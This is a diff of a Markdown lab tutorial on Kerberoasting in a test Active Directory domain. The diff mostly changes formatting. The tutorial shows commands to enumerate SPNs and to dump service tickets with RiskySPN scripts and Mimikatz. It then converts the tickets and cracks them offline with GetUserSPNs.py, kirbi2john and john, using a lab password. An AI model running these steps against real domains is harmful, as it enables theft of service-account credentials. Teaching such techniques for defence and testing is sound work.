@@ -18,7 +18,6 @@ used to associate a service on a specific server to a service account in AD
 An SPN must be unique in the forest
 
 ## SPN Format
-
 ```
 serviceclass/host:port servicename
 MSSQLSvc/domainAD.karim.net:1443 karim\mssqlserver
@@ -31,7 +30,8 @@ HOST:
 
 port:	
   * An optional TCP or UDP port number to differentiate between multiple instances of the same service class on a single host computer
-servicename
+  
+servicename :
   * The distinguished name or objectGUID of an object in Active Directory Domain Services, such as a service connection point (SCP).
   * The DNS name of the domain for a service that provides a specified service for a domain as a whole.
 
@@ -47,9 +47,8 @@ Any domain user can request tickets for any service
   * No high privileges required
   * Service must not be active
 
-
 ## SPN Discover
-## Find-PotentiallyCrackableAccounts.ps1
+## 1-Find-PotentiallyCrackableAccounts.ps1
 ```
 download script: https://raw.githubusercontent.com/cyberark/RiskySPN/master/Find-PotentiallyCrackableAccounts.ps1
 ```
@@ -71,13 +70,10 @@ download script: https://raw.githubusercontent.com/nidem/kerberoast/master/GetUs
 .\GetUserSPNs.ps1
 ```
 
-
 <img src="/img/kerberosting/13.png" alt="Getting-gz" width="1000" height="200"> 
-
 
 ## TGSCipher.ps1
 Dump TGS ticket
-
 ```
 download script:https://raw.githubusercontent.com/cyberark/RiskySPN/master/Get-TGSCipher.ps1
 ```
@@ -86,16 +82,15 @@ download script:https://raw.githubusercontent.com/cyberark/RiskySPN/master/Get-T
  Get-TGSCipher -SPN "MSSQLSvc/domainAD.karim.net:1443" -Format John
  ```
  
- <img src="/img/kerberosting/14.PNG" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/kerberosting/14.PNG" alt="Getting-gz" width="1000" height="200"> 
 
- 
  ## Mimikatz
  
- <img src="/img/kerberosting/m1.PNG" alt="Getting-gz" width="1000" height="200"> 
+<img src="/img/kerberosting/m1.PNG" alt="Getting-gz" width="1000" height="200"> 
 
- ```
- Kerberos::list  ## for SPN discovery.
- ```
+```
+Kerberos::list  ## for SPN discovery.
+```
 
 <img src="/img/kerberosting/m2.PNG" alt="Getting-gz" width="1000" height="200"> 
 
@@ -111,14 +106,12 @@ kerberos::list /export
 
 ## kirbi2john.py 
 Convert the Kirbi to Hash 
-
 ```
 kirbi2john.py 3-40a50000-admin@ldap\~domainAD.karim.net\~DomainDnsZones.karim.net-KARIM.NET.kirbi
 ```
 
 <img src="/img/kerberosting/222222.PNG" alt="Getting-gz" width="1000" height="300"> 
  
-
 ## GetUserSPNs.py
 find user account used as service account
 ```
@@ -141,7 +134,6 @@ sudo ntpdate  192.168.128.140
 
 <img src="/img/kerberosting/err2.PNG" alt="Getting-gz" width="1000" height="200"> 
 
-  
 ```
 python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 -request-user websvc
 ```
@@ -153,3 +145,5 @@ john --wordlist=/usr/share/wordlists/rockyou.txt tgs
 ```
   
 <img src="/img/kerberosting/john.PNG" alt="Getting-gz" width="1000" height="300"> 
+
+I finished part 1 in Kerberos attacks today waite me in the next part.
